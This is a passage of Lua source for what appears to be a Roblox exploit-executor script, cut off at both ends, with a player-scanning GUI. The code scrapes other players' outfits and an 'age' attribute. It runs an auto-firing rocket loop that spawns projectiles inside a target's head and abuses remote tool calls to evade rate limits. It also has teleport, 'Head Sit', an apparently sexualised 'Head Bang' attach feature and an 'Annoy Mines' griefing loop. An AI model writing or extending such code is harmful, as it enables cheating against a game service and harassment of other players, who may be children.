    SourceLabel.TextColor3 = Color3.fromRGB(255, 180, 0)
    SourceLabel.Font = Enum.Font.Code
    SourceLabel.TextSize = 11
    SourceLabel.TextXAlignment = Enum.TextXAlignment.Left
    SourceLabel.BackgroundTransparency = 1
    SourceLabel.Parent = CardFrame

    local IdBox = Instance.new("TextBox")
    IdBox.Size = UDim2.new(1, -115, 0, 22)
    IdBox.Position = UDim2.new(0, 110, 0, 76)
    IdBox.Text = tostring(numericId)
    IdBox.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
    IdBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    IdBox.Font = Enum.Font.Code
    IdBox.TextSize = 12
    IdBox.ClearTextOnFocus = false
    IdBox.TextEditable = true
    IdBox.Parent = CardFrame

    task.spawn(function()
        local success, info = pcall(function()
            return MarketplaceService:GetProductInfo(numericId, Enum.InfoType.Asset)
        end)
        
        if not success or not info or info.Name == "" then
            pcall(function()
                local collection = InsertService:GetInboundExtensionIds(numericId)
                if collection and #collection > 0 then
                    local alternativeId = collection[1]
                    local altSuccess, altInfo = pcall(function()
                        return MarketplaceService:GetProductInfo(alternativeId, Enum.InfoType.Asset)
                    end)
                    if altSuccess and altInfo then info = altInfo success = true end
                end
            end)
        end

        if success and info then
            NameLabel.Text = info.Name ~= "" and info.Name or "Unnamed Asset Component"
            CreatorLabel.Text = "By: " .. (info.Creator and info.Creator.Name or "Roblox")
            if info.Creator and info.Creator.Id and type(info.Creator.Id) == "number" then
                local ok, thumb = pcall(function()
                    return Players:GetUserThumbnailAsync(info.Creator.Id, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size48x48)
                end)
                if ok and thumb then
                    CreatorIcon.Image = thumb
                end
            end
        else
            NameLabel.Text = "Layered Mesh Component"
            CreatorLabel.Text = "Creator: Engine Hidden"
        end
    end)
end
-- ========== AUTO-RL TARGETING SYSTEM (INSTANT HEADSHOT EDITION) ==========
local autoRLTarget = nil
local isAutoFiring = false

-- 🛡️ Target Validation
local function isValidTarget(targ)
    if not targ then return false end
    local success, isValid = pcall(function()
        if not targ.Parent then return false end 
        local char = targ.Character
        if not char or not char.Parent then return false end
        if not char:FindFirstChild("HumanoidRootPart") then return false end
        local hum = char:FindFirstChild("Humanoid")
        if hum and hum.Health <= 0 then return false end
        return true
    end)
    return success and isValid
end

task.spawn(function()
    while true do
        task.wait(0.1) 
        
        local player = game:GetService("Players").LocalPlayer
        local char = player.Character
        local bp = player:FindFirstChild("Backpack")
        
        if isValidTarget(autoRLTarget) then
            if not isAutoFiring then
                isAutoFiring = true
                
                -- 🛑 ANTI-CONFLICT: Turn off Rapid Fire
                if noCooldownEnabled then
                    noCooldownEnabled = false
                    if NoCooldownBtn then
                        NoCooldownBtn.Text = "⚡ Rapid Fire: OFF"
                        NoCooldownBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
                    end
                end
                
                local Send = getgenv().Send or (getgenv().g and getgenv().g.Send)
                
                -- Clear inventory
                pcall(function()
                    if Send then Send("delete_tool") end
                    if char then
                        for _, v in ipairs(char:GetChildren()) do
                            if v:IsA("Tool") and v.Name == "RocketLauncher" then v:Destroy() end
                        end
                    end
                    if bp then
                        for _, v in ipairs(bp:GetChildren()) do
                            if v.Name == "RocketLauncher" then v:Destroy() end
                        end
                    end
                end)
                
                -- 💥 THE SYNCHRONIZED LOOP
                while isAutoFiring do
                    local currentChar = player.Character
                    local currentBp = player:FindFirstChild("Backpack")
                    
                    -- Break immediately if YOU die or TARGET dies
                    if not isValidTarget(autoRLTarget) or not currentChar or not currentChar.Parent or not currentBp then
                        break
                    end
                    
                    -- Check if we already have a launcher (fixes rate-limit spam)
                    local newLauncher = currentChar:FindFirstChild("RocketLauncher") or currentBp:FindFirstChild("RocketLauncher")
                    
                    if not newLauncher then
                        if Send then Send("get_tool", "RocketLauncher") end
                        
                        -- Custom Wait: Checks both Backpack AND Character simultaneously for 0.2s
                        local timer = 0
                        while timer < 0.2 do
                            newLauncher = currentChar:FindFirstChild("RocketLauncher") or currentBp:FindFirstChild("RocketLauncher")
                            if newLauncher then break end
                            timer = timer + task.wait(0.01)
                        end
                    end
                    
                    if newLauncher then
                        -- PROTECTED EQUIP
                        local equipSuccess = pcall(function()
                            newLauncher.Parent = currentChar
                        end)
                        
                        if equipSuccess then
                            -- PROTECTED AIM (INSTANT HEADSHOT CALCULATION)
                            local aimSuccess, targetCFrame = pcall(function()
                                local targetPart = autoRLTarget.Character:FindFirstChild("Head") or autoRLTarget.Character.HumanoidRootPart
                                -- Spawns the rocket PERFECTLY inside their head, aiming straight down to instantly detonate
                                return CFrame.new(targetPart.Position, targetPart.Position - Vector3.new(0, 1, 0))
                            end)
                            
                            if aimSuccess and targetCFrame then
                                if Send then Send("shoot_rocket", newLauncher, targetCFrame) end
                            end
                        end
                        
                        -- PROTECTED DELETE
                        pcall(function()
                            if Send then Send("delete_tool") end
                            newLauncher:Destroy()
                        end)
                    else
                        -- If the server lagged and didn't give a tool, wait slightly so we don't spam the network
                        task.wait(0.05)
                    end
                    
                    task.wait(0.01) 
                end
                
                isAutoFiring = false
                if Send then Send("get_tool", "RocketLauncher") end
            end
        else
            if autoRLTarget and not autoRLTarget.Parent then
                autoRLTarget = nil
            end
            isAutoFiring = false
        end
    end
end)

-- Scan Logic (Now accepts frozen snapshot data)
local function deepScanPlayerOutfit(targetPlayer, cachedDescription)
    for _, child in pairs(AssetScroll:GetChildren()) do
        if child:IsA("Frame") then child:Destroy() end
    end
    
    Title.Text = "🧬 Scanning: " .. targetPlayer.DisplayName
    PlayerScroll.Visible = false
    PlayerSearchBar.Visible = false -- < ADD THIS LINE
    AssetScroll.Visible = true
    RefreshBtn.Visible = false
    BackBtn.Visible = true

    -- Use the frozen snapshot. If they weren't loaded during refresh, fallback to live.
    local description = cachedDescription
    if not description then
        local liveChar = targetPlayer.Character or Workspace:FindFirstChild(targetPlayer.Name)
        local humanoid = liveChar and liveChar:FindFirstChildOfClass("Humanoid")
        if humanoid then
            pcall(function() description = humanoid:GetAppliedDescription() end)
        end
    end

    if not description then return end -- Abort if no data could be found

    local avatarFrame = Instance.new("Frame")
    avatarFrame.Size = UDim2.new(1, -5, 0, 250)
    avatarFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
    avatarFrame.BorderSizePixel = 1
    avatarFrame.BorderColor3 = Color3.fromRGB(0, 255, 150)
    avatarFrame.LayoutOrder = 1
    avatarFrame.Parent = AssetScroll

      local bigViewport = Instance.new("ViewportFrame")
    bigViewport.Size = UDim2.new(1, 0, 1, 0)
    bigViewport.BackgroundTransparency = 1
    bigViewport.Parent = avatarFrame

    -- [NEW] WorldModel fixes Layered Clothing glitches!
    local worldModel = Instance.new("WorldModel")
    worldModel.Parent = bigViewport

    -- Viewport generation using the frozen snapshot (Immune to live changes!)
    task.spawn(function()
        local charClone
        local success = pcall(function()
            -- Builds a fresh dummy using the frozen snapshot data
            charClone = Players:CreateHumanoidModelFromDescription(description, Enum.HumanoidRigType.R15)
        end)
        
        -- Fallback if Roblox's API fails
        if not success or not charClone then
            pcall(function()
                local myChar = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
                local oldArch = myChar.Archivable
                myChar.Archivable = true
                charClone = myChar:Clone()
                myChar.Archivable = oldArch
                local hum = charClone:FindFirstChildOfClass("Humanoid")
                if hum then hum:ApplyDescription(description) end
            end)
        end

        if charClone then
            for _, v in pairs(charClone:GetDescendants()) do
                if v:IsA("Script") or v:IsA("LocalScript") then
                    v:Destroy()
                end
            end
            
            -- [NEW] Center the model at 0,0,0 to stop camera rendering glitches
            charClone:PivotTo(CFrame.new(0, 0, 0))
            
            -- [NEW] Parent the avatar to the WorldModel, NOT the Viewport directly!
            charClone.Parent = worldModel
            
            local camera = Instance.new("Camera")
            camera.Parent = bigViewport
            
            local hrp = charClone:FindFirstChild("HumanoidRootPart") or charClone:FindFirstChild("Torso") or charClone:FindFirstChild("UpperTorso")
            if hrp then
                camera.CFrame = hrp.CFrame * CFrame.new(0, 0.5, -6) * CFrame.Angles(0, math.pi, 0)
                camera.Focus = hrp.CFrame
            end
            
            bigViewport.CurrentCamera = camera
        end
    end)

  
    do
        local infoFrame = Instance.new("Frame")
        infoFrame.Size = UDim2.new(1, -5, 0, 80)
        infoFrame.BackgroundColor3 = Color3.fromRGB(22, 22, 26)
        infoFrame.BorderSizePixel = 0
      infoFrame.LayoutOrder = 3
        infoFrame.Parent = AssetScroll

        local infoTitle = Instance.new("TextLabel")
        infoTitle.Size = UDim2.new(1, -10, 0, 20)
        infoTitle.Position = UDim2.new(0, 5, 0, 6)
        infoTitle.Text = "Avatar Info"
        infoTitle.BackgroundTransparency = 1
        infoTitle.TextColor3 = Color3.fromRGB(0, 255, 200)
        infoTitle.Font = Enum.Font.SourceSansBold
        infoTitle.TextSize = 14
        infoTitle.TextXAlignment = Enum.TextXAlignment.Left
        infoTitle.Parent = infoFrame

        local rigLabel = Instance.new("TextLabel")
        rigLabel.Size = UDim2.new(1, -10, 0, 16)
        rigLabel.Position = UDim2.new(0, 5, 0, 28)
        local rigText = "Rig: "
        pcall(function()
            rigText = rigText .. tostring(humanoid.RigType and tostring(humanoid.RigType):gsub("Enum.HumanoidRigType.", "") or "Unknown")
        end)
        rigLabel.Text = rigText
        rigLabel.BackgroundTransparency = 1
        rigLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
        rigLabel.Font = Enum.Font.SourceSans
        rigLabel.TextSize = 12
        rigLabel.TextXAlignment = Enum.TextXAlignment.Left
        rigLabel.Parent = infoFrame

        local function safeGet(prop)
            local ok, val = pcall(function() return description[prop] end)
            if ok and val ~= nil then return val else return nil end
        end

        local headScale = safeGet("HeadScale")
        local heightScale = safeGet("HeightScale")
        local widthScale = safeGet("WidthScale")
        local bodyTypeScale = safeGet("BodyTypeScale")
        local proportionScale = safeGet("ProportionScale")

        local scalesText = "HeadScale: " .. tostring(headScale or "N/A")
                        .. "  HeightScale: " .. tostring(heightScale or "N/A")
                        .. "\nWidthScale: " .. tostring(widthScale or "N/A")
                        .. "  BodyTypeScale: " .. tostring(bodyTypeScale or "N/A")
                        .. "  ProportionScale: " .. tostring(proportionScale or "N/A")

        local scalesLabel = Instance.new("TextLabel")
        scalesLabel.Size = UDim2.new(1, -10, 0, 34)
        scalesLabel.Position = UDim2.new(0, 5, 0, 44)
        scalesLabel.Text = scalesText
        scalesLabel.BackgroundTransparency = 1
        scalesLabel.TextColor3 = Color3.fromRGB(190, 190, 200)
        scalesLabel.Font = Enum.Font.Code
        scalesLabel.TextSize = 12
        scalesLabel.TextXAlignment = Enum.TextXAlignment.Left
        scalesLabel.TextWrapped = true
        scalesLabel.Parent = infoFrame

        local outfitData = {}
        local function getVal(prop)
            local ok, val = pcall(function() return description[prop] end)
            if not ok or val == nil then return nil end
            return val
        end

          outfitData.SwimAnimation = getVal("SwimAnimation")
        
        -- FIXED: Grab the actual HeadColor to use as the overall SkinTone
        local hc = getVal("HeadColor")
        if typeof(hc) == "Color3" then
            outfitData.SkinTone = {hc.R, hc.G, hc.B}
        end
        
        outfitData.Face = getVal("Face")

        outfitData.JumpAnimation = getVal("JumpAnimation")
        outfitData.ClimbAnimation = getVal("ClimbAnimation")
        outfitData.Shirt = getVal("Shirt")
        outfitData.Pants = getVal("Pants")
        outfitData.RightArm = getVal("RightArm")
   
outfitData.WalkAnimation = getVal("WalkAnimation")
        task.wait(0.1)
outfitData.WalkAnimation = getVal("WalkAnimation")

        outfitData.Head = getVal("Head")
        outfitData.WidthScale = widthScale
        outfitData.GraphicTShirt = getVal("GraphicTShirt")

      -- Pull the custom age attribute directly from the player being scanned
        local targetAge = targetPlayer:GetAttribute("age")
        if targetAge then 
            outfitData.Age = tostring(targetAge) 
        end
        
        outfitData.RunAnimation = getVal("RunAnimation")
        outfitData.FallAnimation = getVal("FallAnimation")
        outfitData.IdleAnimation = getVal("IdleAnimation")
        outfitData.Accessories = {}

            pcall(function()
            local accs = description:GetAccessories(true)
            if accs and type(accs) == "table" then
                for _, a in pairs(accs) do
                    table.insert(outfitData.Accessories, {
                        AssetId = a.AssetId,
                        IsLayered = a.IsLayered,
                        AccessoryType = a.AccessoryType and tostring(a.AccessoryType):gsub("Enum.AccessoryType.", "") or a.AccessoryType,
                        Order = a.Order,          -- 🔥 ADDED: Saves the exact wrapping layer
                        Puffiness = a.Puffiness   -- 🔥 ADDED: Saves the exact jacket puffiness
                    })
                end
            end
        end)


        outfitData.LeftArm = getVal("LeftArm")
        outfitData.RightLeg = getVal("RightLeg")
        outfitData.HeightScale = heightScale

        outfitData.BodyTypeScale = bodyTypeScale
        outfitData.ProportionScale = proportionScale
        outfitData.HeadScale = headScale

        outfitData.Torso = getVal("Torso")
        outfitData.LeftLeg = getVal("LeftLeg")

             local safeOutfit = {}
        for k, v in pairs(outfitData) do
            if typeof(v) == "Instance" or typeof(v) == "EnumItem" then
                safeOutfit[k] = tostring(v)
            else
                safeOutfit[k] = v
            end
        end
        
        -- INJECT THE TIMESTAMP: Save the exact Unix time this was scanned
        safeOutfit.SavedAtTime = os.time()

        local ok, jsonText = pcall(function()
            return HttpService:JSONEncode(safeOutfit)
        end)

        -- Action Panel & Raw JSON Output Box
            -- Raw JSON Output Box
        local rawFrame = Instance.new("Frame")
        rawFrame.Size = UDim2.new(1, -5, 0, 165) 
        rawFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
        rawFrame.BorderSizePixel = 0
        rawFrame.LayoutOrder = 4 -- Puts JSON at the very bottom
        rawFrame.Parent = AssetScroll

        local rawTitle = Instance.new("TextLabel")
        rawTitle.Size = UDim2.new(1, -10, 0, 18)
        rawTitle.Position = UDim2.new(0, 5, 0, 6)
        rawTitle.Text = "Raw JSON Data"
        rawTitle.BackgroundTransparency = 1
        rawTitle.TextColor3 = Color3.fromRGB(0, 255, 200)
        rawTitle.Font = Enum.Font.SourceSansBold
        rawTitle.TextSize = 13
        rawTitle.TextXAlignment = Enum.TextXAlignment.Left
        rawTitle.Parent = rawFrame

        local rawBox = Instance.new("TextBox")
        rawBox.Size = UDim2.new(1, -10, 0, 130)
        rawBox.Position = UDim2.new(0, 5, 0, 26)
        rawBox.Text = ok and jsonText or "{}"
        rawBox.TextWrapped = true
        rawBox.TextXAlignment = Enum.TextXAlignment.Left
        rawBox.TextYAlignment = Enum.TextYAlignment.Top
        rawBox.BackgroundColor3 = Color3.fromRGB(12, 12, 16)
        rawBox.TextColor3 = Color3.fromRGB(220, 220, 220)
        rawBox.Font = Enum.Font.Code
        rawBox.TextSize = 11
        rawBox.ClearTextOnFocus = false
        rawBox.TextEditable = false
        rawBox.TextScaled = false
        rawBox.MultiLine = true
        rawBox.Parent = rawFrame

        -- ==========================================
        -- NEW ACTION PANEL (Moved Above Avatar Info!)
        -- ==========================================
        local actionFrame = Instance.new("Frame")
        actionFrame.Size = UDim2.new(1, -5, 0, 60)
        actionFrame.BackgroundTransparency = 1
        actionFrame.LayoutOrder = 2 -- Magically places it right below the 3D Avatar!
        actionFrame.Parent = AssetScroll

        -- Button Layout Container
        local actionLayout = Instance.new("Frame")
        actionLayout.Size = UDim2.new(1, -10, 1, 0)
        actionLayout.Position = UDim2.new(0, 5, 0, 0)
        actionLayout.BackgroundTransparency = 1
        actionLayout.Parent = actionFrame

        -- Grid Layout specifically designed for 4 buttons per row
        local uigrid = Instance.new("UIGridLayout")
        uigrid.CellSize = UDim2.new(0.235, 0, 0, 26) 
        uigrid.CellPadding = UDim2.new(0.02, 0, 0.08, 0)
        uigrid.SortOrder = Enum.SortOrder.LayoutOrder
        uigrid.FillDirectionMaxCells = 4
        uigrid.Parent = actionLayout

        -- ==========================================
        -- ROW 1: COPY, SAVE, TRY ON, TRY & SHARE
        -- ==========================================
    local copyBtn = Instance.new("TextButton")
        copyBtn.Text = "Copy JSON"
        copyBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 90)
        copyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        copyBtn.Font = Enum.Font.SourceSansBold
        copyBtn.TextSize = 11
        copyBtn.BorderSizePixel = 0
        copyBtn.LayoutOrder = 1
        copyBtn.Parent = actionLayout

        local saveBtn = Instance.new("TextButton")
        saveBtn.Text = "Save File"
        saveBtn.BackgroundColor3 = Color3.fromRGB(40, 170, 90)
        saveBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        saveBtn.Font = Enum.Font.SourceSansBold
        saveBtn.TextSize = 11
        saveBtn.BorderSizePixel = 0
        saveBtn.LayoutOrder = 2
        saveBtn.Parent = actionLayout

        local wearBtn = Instance.new("TextButton")
        wearBtn.Text = "Try On"
        wearBtn.BackgroundColor3 = Color3.fromRGB(249, 180, 0)
        wearBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
        wearBtn.Font = Enum.Font.SourceSansBold
        wearBtn.TextSize = 11
        wearBtn.BorderSizePixel = 0
        wearBtn.LayoutOrder = 3
        wearBtn.Parent = actionLayout

        local tryShareBtn = Instance.new("TextButton")
        tryShareBtn.Text = "Share All"
        tryShareBtn.BackgroundColor3 = Color3.fromRGB(200, 100, 200)
        tryShareBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        tryShareBtn.Font = Enum.Font.SourceSansBold
        tryShareBtn.TextSize = 11
        tryShareBtn.BorderSizePixel = 0
        tryShareBtn.LayoutOrder = 4
        tryShareBtn.Parent = actionLayout

        -- ==========================================
        -- ROW 2: VIEW, WHITELIST
        -- ==========================================
        local viewBtn = Instance.new("TextButton")
        -- Smart Check: Make it red if already viewing this player
        if isViewing and selectedSpectateTarget == targetPlayer then
            viewBtn.Text = "Unview"
            viewBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
        else
            viewBtn.Text = "View"
            viewBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 150)
        end
        viewBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        viewBtn.Font = Enum.Font.SourceSansBold
        viewBtn.TextSize = 11
        viewBtn.BorderSizePixel = 0
        viewBtn.LayoutOrder = 5
        viewBtn.Parent = actionLayout

      
        local isWl = massWhitelist[targetPlayer.Name]
        local wlBtn = Instance.new("TextButton")
        wlBtn.Text = isWl and "Safe" or "Whitelist"
        wlBtn.BackgroundColor3 = isWl and Color3.fromRGB(40, 170, 90) or Color3.fromRGB(50, 50, 60)
        wlBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        wlBtn.Font = Enum.Font.SourceSansBold
        wlBtn.TextSize = 11
        wlBtn.BorderSizePixel = 0
        wlBtn.LayoutOrder = 6
        wlBtn.Parent = actionLayout
 -- ==========================================

        -- ==========================================
        -- ROW 2: TARGET RL BUTTON
        -- ==========================================
        local targetRlBtn = Instance.new("TextButton")
        if autoRLTarget == targetPlayer then
            targetRlBtn.Text = "Untarget RL"
            targetRlBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50) -- Red when active
        else
            targetRlBtn.Text = "Target RL"
            targetRlBtn.BackgroundColor3 = Color3.fromRGB(200, 100, 50) -- Orange when inactive
        end
        targetRlBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        targetRlBtn.Font = Enum.Font.SourceSansBold
        targetRlBtn.TextSize = 11
        targetRlBtn.BorderSizePixel = 0
        targetRlBtn.LayoutOrder = 7
        targetRlBtn.Parent = actionLayout
        -- (Optional: add a UICorner here if you want round edges on target RL too)
        -- Instance.new("UICorner", targetRlBtn).CornerRadius = UDim.new(0, 4)

        -- ==========================================
        -- ROW 2: SHARE TO FRIENDS BUTTON (NEW!)
        -- ==========================================
        local ShareFriendsBtn = Instance.new("TextButton")
        ShareFriendsBtn.BackgroundColor3 = Color3.fromRGB(50, 150, 50) -- Friendly Green
        ShareFriendsBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        ShareFriendsBtn.Font = Enum.Font.SourceSansBold
        ShareFriendsBtn.TextSize = 11 -- Matched to targetRlBtn text size
        ShareFriendsBtn.Text = "Share to WL"
        ShareFriendsBtn.BorderSizePixel = 0
        ShareFriendsBtn.LayoutOrder = 8 -- Snaps it directly after Target RL
        ShareFriendsBtn.Parent = actionLayout 
        
     ShareFriendsBtn.MouseButton1Click:Connect(function()
    -- 1. Prove the click is actually registering
    ShareFriendsBtn.Text = "Testing..."
    
    if outfitData then
        -- 2. Wrap it in a protective pcall so it can't crash silently
        local success, errorMessage = pcall(function()
            shareOutfitToFriends(outfitData, ShareFriendsBtn, "Share to WL", Color3.fromRGB(50, 150, 50), targetPlayer)
        end)
        
        -- 3. If it crashed, print the exact error on the button!
        if not success then
            warn("SHARE FRIENDS ERROR: " .. tostring(errorMessage))
            ShareFriendsBtn.Text = "Check F9 Console!"
            ShareFriendsBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
            task.wait(3)
            ShareFriendsBtn.Text = "Share to WL"
            ShareFriendsBtn.BackgroundColor3 = Color3.fromRGB(50, 150, 50)
        end
    else
        ShareFriendsBtn.Text = "Error: No Data"
        ShareFriendsBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
        task.wait(1.5)
        ShareFriendsBtn.Text = "Share to WL"
        ShareFriendsBtn.BackgroundColor3 = Color3.fromRGB(50, 150, 50)
    end
end)
-- ==========================================
        -- 🎬 CUSTOM ANIMATION HANDLERS
        -- ==========================================
        local RunService = game:GetService("RunService")
        local myPlayer = game:GetService("Players").LocalPlayer

        local function PlayAnim(id, time, speed)
            pcall(function()
                local char = myPlayer.Character
                if not char then return end
                
                local animateScript = char:FindFirstChild("Animate")
                local hum = char:FindFirstChildOfClass("Humanoid")
                if not hum then return end
                
                if animateScript then animateScript.Disabled = false end
                
                local animtrack = hum:GetPlayingAnimationTracks()
                for _, track in pairs(animtrack) do
                    track:Stop()
                end
                
                if animateScript then animateScript.Disabled = true end
                
                local Anim = Instance.new("Animation")
                Anim.AnimationId = "rbxassetid://" .. tostring(id)
                local loadanim = hum:LoadAnimation(Anim)
                loadanim:Play()
                loadanim.TimePosition = time
                loadanim:AdjustSpeed(speed)
                
                loadanim.Stopped:Connect(function()
                    if animateScript then animateScript.Disabled = false end
                    for _, track in pairs(hum:GetPlayingAnimationTracks()) do
                        track:Stop()
                    end
                end)
            end)
        end

        local function StopAnim()
            pcall(function()
                local char = myPlayer.Character
                if not char then return end
                
                local animateScript = char:FindFirstChild("Animate")
                local hum = char:FindFirstChildOfClass("Humanoid")
                if not hum then return end
                
                if animateScript then animateScript.Disabled = false end
                
                local animtrack = hum:GetPlayingAnimationTracks()
                for _, track in pairs(animtrack) do
                    track:Stop()
                end
            end)
        end
        -- ==========================================
        -- ROW 3: MOVEMENT & TROLLING (LayoutOrders 9, 10, 11, 12)
        -- ==========================================
        local RunService = game:GetService("RunService")
        local myPlayer = game:GetService("Players").LocalPlayer
        local g = getgenv()

        -- 1. 🌌 TELEPORT BUTTON
        local TpBtn = Instance.new("TextButton")
        TpBtn.BackgroundColor3 = Color3.fromRGB(40, 100, 180) -- Blue
        TpBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        TpBtn.Font = Enum.Font.SourceSansBold
        TpBtn.TextSize = 11
        TpBtn.Text = "Teleport"
        TpBtn.BorderSizePixel = 0
        TpBtn.LayoutOrder = 9
        TpBtn.Parent = actionLayout 

        TpBtn.MouseButton1Click:Connect(function()
            local myChar = myPlayer.Character
            local tChar = targetPlayer.Character
            local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
            local tRoot = tChar and tChar:FindFirstChild("HumanoidRootPart")
            
            if myRoot and tRoot then
                myRoot.CFrame = tRoot.CFrame * CFrame.new(0, 0, -3) * CFrame.Angles(0, math.rad(180), 0)
                TpBtn.BackgroundColor3 = Color3.fromRGB(100, 200, 255)
                task.wait(0.2)
                TpBtn.BackgroundColor3 = Color3.fromRGB(40, 100, 180)
            end
        end)

        -- 2. 🪑 HEAD SIT BUTTON (SMART SWAP)
        local HeadSitBtn = Instance.new("TextButton")
        if g.activeSitTarget == targetPlayer then
            HeadSitBtn.Text = "Un-Sit"
            HeadSitBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
        else
            HeadSitBtn.Text = "Head Sit"
            HeadSitBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 65) 
        end
        HeadSitBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        HeadSitBtn.Font = Enum.Font.SourceSansBold
        HeadSitBtn.TextSize = 11
        HeadSitBtn.BorderSizePixel = 0
        HeadSitBtn.LayoutOrder = 10
        HeadSitBtn.Parent = actionLayout 

        HeadSitBtn.MouseButton1Click:Connect(function()
            local char = myPlayer.Character
            local root = char and char:FindFirstChild("HumanoidRootPart")
            local hum = char and char:FindFirstChildOfClass("Humanoid")
            
            -- If already sitting on THIS player, turn it OFF
            if g.activeSitTarget == targetPlayer then
                g.activeSitTarget = nil
                if g.activeSitLoop then g.activeSitLoop:Disconnect(); g.activeSitLoop = nil end
                
                HeadSitBtn.Text = "Head Sit"
                HeadSitBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
                if hum then hum.Sit = false end
            else
                -- SWAP to or turn ON for NEW target
                g.activeSitTarget = targetPlayer
                if g.activeSitLoop then g.activeSitLoop:Disconnect(); g.activeSitLoop = nil end
                
                HeadSitBtn.Text = "Un-Sit"
                HeadSitBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
                if hum then hum.Sit = true end
                
                g.activeSitLoop = RunService.RenderStepped:Connect(function()
                    pcall(function()
                        local tChar = g.activeSitTarget and g.activeSitTarget.Character
                        local tHead = tChar and tChar:FindFirstChild("Head")
                        
                        if root and tHead then
                            root.Velocity = Vector3.new(0, 0, 0)
                            root.CFrame = tHead.CFrame * CFrame.new(0, 2, 0)
                        else
                            -- Auto-disable if they leave/die
                            g.activeSitTarget = nil
                            if g.activeSitLoop then g.activeSitLoop:Disconnect(); g.activeSitLoop = nil end
                            HeadSitBtn.Text = "Head Sit"
                            HeadSitBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
                            if hum then hum.Sit = false end
                        end
                    end)
                end)
            end
        end)

        -- 3. 💥 HEAD BANG BUTTON (SMART SWAP)
        local BangBtn = Instance.new("TextButton")
        if g.activeBangTarget == targetPlayer then
            BangBtn.Text = "Stop Bang"
            BangBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
        else
            BangBtn.Text = "Head Bang"
            BangBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 65) 
        end
        BangBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        BangBtn.Font = Enum.Font.SourceSansBold
        BangBtn.TextSize = 11
        BangBtn.BorderSizePixel = 0
        BangBtn.LayoutOrder = 11
        BangBtn.Parent = actionLayout 

        BangBtn.MouseButton1Click:Connect(function()
            local char = myPlayer.Character
            local root = char and char:FindFirstChild("HumanoidRootPart")
            
            -- If already banging THIS player, turn it OFF
            if g.activeBangTarget == targetPlayer then
                g.activeBangTarget = nil
                if g.activeBangLoop then g.activeBangLoop:Disconnect(); g.activeBangLoop = nil end
                
                BangBtn.Text = "Head Bang"
                BangBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
                StopAnim()
            else
                -- SWAP to or turn ON for NEW target
                g.activeBangTarget = targetPlayer
                if g.activeBangLoop then g.activeBangLoop:Disconnect(); g.activeBangLoop = nil end
                
                BangBtn.Text = "Stop Bang"
                BangBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
                
                PlayAnim(125462520730682, 0, 1)
                        
                g.activeBangLoop = RunService.RenderStepped:Connect(function()
                    pcall(function()
                        local tChar = g.activeBangTarget and g.activeBangTarget.Character
                        local tRoot = tChar and tChar:FindFirstChild("HumanoidRootPart")
                        
                        if root and tRoot then
                            root.Velocity = Vector3.new(0, 0, 0)
                            root.CFrame = tRoot.CFrame * CFrame.new(0, 0, 1.1)
                        else
                            -- Auto-disable if they leave/die
                            g.activeBangTarget = nil
                            if g.activeBangLoop then g.activeBangLoop:Disconnect(); g.activeBangLoop = nil end
                            BangBtn.Text = "Head Bang"
                            BangBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
                            StopAnim()
                        end
                    end)
                end)
            end
        end)

        -- 4. 💣 ANNOY MINES BUTTON (SMART SWAP + OVERLAP DESYNC)
        local AnnoyBtn = Instance.new("TextButton")
        if g.activeAnnoyTarget == targetPlayer then
            AnnoyBtn.Text = "Stop Annoy"
            AnnoyBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
        else
            AnnoyBtn.Text = "Annoy Mines"
            AnnoyBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 65) 
        end
        AnnoyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        AnnoyBtn.Font = Enum.Font.SourceSansBold
        AnnoyBtn.TextSize = 11
        AnnoyBtn.BorderSizePixel = 0
        AnnoyBtn.LayoutOrder = 12
        AnnoyBtn.Parent = actionLayout 

        AnnoyBtn.MouseButton1Click:Connect(function()
            local Send = g.Send or (g.g and g.g.Send)
            
            -- Turn OFF if already annoying THIS player
            if g.activeAnnoyTarget == targetPlayer then
                g.activeAnnoyTarget = nil
                AnnoyBtn.Text = "Annoy Mines"
                AnnoyBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
                if Send then Send("delete_tool") end
            else
                -- SWAP to or turn ON for NEW target
                g.activeAnnoyTarget = targetPlayer
                AnnoyBtn.Text = "Stop Annoy"
                AnnoyBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
                
                if Send then Send("delete_tool") end
                
                task.spawn(function()
                    while g.activeAnnoyTarget == targetPlayer do
                        local char = myPlayer.Character
                        local bp = myPlayer:FindFirstChild("Backpack")
                        local tChar = targetPlayer.Character
                        local tHead = tChar and tChar:FindFirstChild("Head")
                        
